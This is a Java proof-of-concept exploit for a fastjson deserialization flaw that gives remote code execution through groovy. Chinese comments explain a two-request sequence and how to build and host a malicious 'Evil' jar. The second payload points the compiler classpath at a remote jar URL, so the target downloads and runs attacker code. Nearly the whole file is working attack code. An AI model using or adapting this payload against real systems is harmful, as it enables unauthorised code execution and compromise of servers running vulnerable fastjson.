import com.alibaba.fastjson.JSON;

// rce
// 可用，需要发送两次报文，依赖 groovy
// 前一次会抛异常，但是会将ProcessingUnit写进了cache
// 第二次就可以成功进入后续流程，且第二次攻击可以反复进行
//
// 需要准备恶意jar包，放置到服务器可访问的位置，格式如下
//
// META-INF/services/org.codehaus.groovy.transform.ASTTransformation
//      Evil
// Evil.class
//
public class groovy {
    private static String poc1 = "{\n" +
            "    \"@type\":\"java.lang.Exception\",\n" +
            "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
            "    \"unit\":{}\n" +
            "}";

    private static String poc2 = "{\n" +
            "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
            "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
            "    \"config\":{\n" +
            "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
            "        \"classpathList\":\"http://victim.com/Evil.jar\"\n" +
            "    }\n" +
            "}";



    public static void main(String[] args) {
        try {
            JSON.parseObject(poc1);
        } catch (Exception e){}

        JSON.parseObject(poc2);

//		System.out.println(pocall);
//		JSON.parseObject(pocall);
    }

}
